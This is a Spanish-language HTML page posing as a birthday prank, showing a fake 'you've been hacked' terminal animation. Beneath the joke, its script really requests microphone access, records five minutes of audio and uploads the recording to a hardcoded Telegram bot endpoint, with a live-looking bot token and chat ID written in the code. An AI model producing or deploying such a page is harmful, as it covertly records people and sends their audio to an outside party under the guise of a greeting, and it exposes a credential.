<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Feliz Cumpleaños!</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        
        .container {
            padding: 20px;
            position: relative;
        }
        
        .matrix {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }
        
        h1 {
            color: #f00;
            text-align: center;
            text-shadow: 0 0 10px #f00;
            animation: glitch 1s linear infinite;
        }
        
        .terminal {
            border: 2px solid #0f0;
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
            height: 300px;
            overflow-y: auto;
        }
        
        .command {
            color: #0f0;
        }
        
        .output {
            color: #0ff;
        }
        
        .error {
            color: #f00;
        }
        
        .blink {
            animation: blink 1s step-end infinite;
        }
        
        @keyframes blink {
            from, to { opacity: 1; }
            50% { opacity: 0; }
        }
        
        @keyframes glitch {
            0% { text-shadow: 2px 0 0 #0f0, -2px 0 0 #f00; }
            25% { text-shadow: -2px 0 0 #0f0, 2px 0 0 #f00; }
            50% { text-shadow: 2px 0 0 #0f0, -2px 0 0 #f00; }
            75% { text-shadow: -2px 0 0 #0f0, 2px 0 0 #f00; }
            100% { text-shadow: 2px 0 0 #0f0, -2px 0 0 #f00; }
        }
        
        .progress-bar {
            width: 100%;
            background-color: #222;
            border-radius: 5px;
            margin: 10px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 20px;
            background-color: #0f0;
            width: 0%;
            transition: width 0.5s;
        }
        
        .recording {
            text-align: center;
            margin-top: 20px;
            display: none;
        }
        
        .pulse {
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.7; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        #countdown {
            font-size: 24px;
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <canvas id="matrix" class="matrix"></canvas>
    
    <div class="container">
        <h1>¡TE HACKIÉ!</h1>
        
        <div class="terminal" id="terminal">
            <p class="command">> Iniciando secuencia de hackeo...</p>
            <p class="output">Analizando sistema objetivo...</p>
            <p class="output">Bypasseando firewalls...</p>
            <p class="error">¡Error! Contramedidas detectadas...</p>
            <p class="output">Inyectando código malicioso...</p>
            <p class="output">Acceso root obtenido!</p>
            <p class="command">> <span class="blink">_</span></p>
        </div>
        
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        
        <div id="countdown"></div>
        
        <div class="recording" id="recording">
            <h2 class="pulse">GRABANDO AUDIO...</h2>
            <p>Estamos recolectando tus datos personales...</p>
            <p id="timer">00:05:00</p>
        </div>
    </div>
    
    <script>
        // Efecto Matrix
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const nums = '0123456789';
        
        const alphabet = katakana + latin + nums;
        
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        
        const rainDrops = [];
        
        for (let x = 0; x < columns; x++) {
            rainDrops[x] = 1;
        }
        
        const draw = () => {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    rainDrops[i] = 0;
                }
                rainDrops[i]++;
            }
        };
        
        setInterval(draw, 30);
        
        // Simulación de terminal
        const terminal = document.getElementById('terminal');
        const progress = document.getElementById('progress');
        
        const commands = [
            "Recopilando datos personales...",
            "Accediendo a la cámara...",
            "Accediendo al micrófono...",
            "Analizando contraseñas guardadas...",
            "Enviando datos al servidor...",
            "¡Hackeo completado con éxito!"
        ];
        
        let currentProgress = 0;
        const progressInterval = setInterval(() => {
            currentProgress += 5;
            progress.style.width = currentProgress + "%";
            
            if (currentProgress >= 100) {
                clearInterval(progressInterval);
                startRecording();
            }
        }, 500);
        
        let commandIndex = 0;
        const commandInterval = setInterval(() => {
            if (commandIndex < commands.length) {
                const p = document.createElement('p');
                p.className = commandIndex % 2 === 0 ? 'output' : 'error';
                p.textContent = commands[commandIndex];
                terminal.appendChild(p);
                terminal.scrollTop = terminal.scrollHeight;
                commandIndex++;
            } else {
                clearInterval(commandInterval);
            }
        }, 1000);
        
        // Grabación de audio
        let mediaRecorder;
        let audioChunks = [];
        let recordingInterval;
        let secondsLeft = 300; // 5 minutos en segundos
        
        function startRecording() {
            document.getElementById('recording').style.display = 'block';
            
            // Mostrar cuenta regresiva
            updateCountdown();
            
            // Solicitar acceso al micrófono
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    mediaRecorder = new MediaRecorder(stream);
                    
                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                        sendAudioToTelegram(audioBlob);
                    };
                    
                    // Grabar en bloques de 1 minuto
                    mediaRecorder.start(60000);
                    
                    // Detener después de 5 minutos
                    setTimeout(() => {
                        mediaRecorder.stop();
                        clearInterval(recordingInterval);
                        document.getElementById('recording').innerHTML = '<h2>¡Datos enviados con éxito!</h2><p>Feliz cumpleaños, esto era una broma :)</p>';
                    }, 300000);
                })
                .catch(err => {
                    console.error('Error al acceder al micrófono:', err);
                    document.getElementById('recording').innerHTML = '<h2 class="error">Error al acceder al micrófono</h2><p>Pero feliz cumpleaños de todos modos :)</p>';
                });
        }
        
        function updateCountdown() {
            const minutes = Math.floor(secondsLeft / 60);
            const seconds = secondsLeft % 60;
            document.getElementById('timer').textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (secondsLeft > 0) {
                secondsLeft--;
                setTimeout(updateCountdown, 1000);
            }
        }
        
        function sendAudioToTelegram(audioBlob) {
            const formData = new FormData();
            formData.append('chat_id', '8064474906');
            formData.append('caption', 'Audio grabado desde la página de broma');
            formData.append('audio', audioBlob, 'hackeo.mp3');
            
            fetch(`https://api.telegram.org/bot7603508622:AAHduDcxlylbwFxpH7YpC02UJT43R31wmuk/sendAudio`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log('Audio enviado:', data))
            .catch(error => console.error('Error al enviar audio:', error));
        }
    </script>
</body>
            </html>
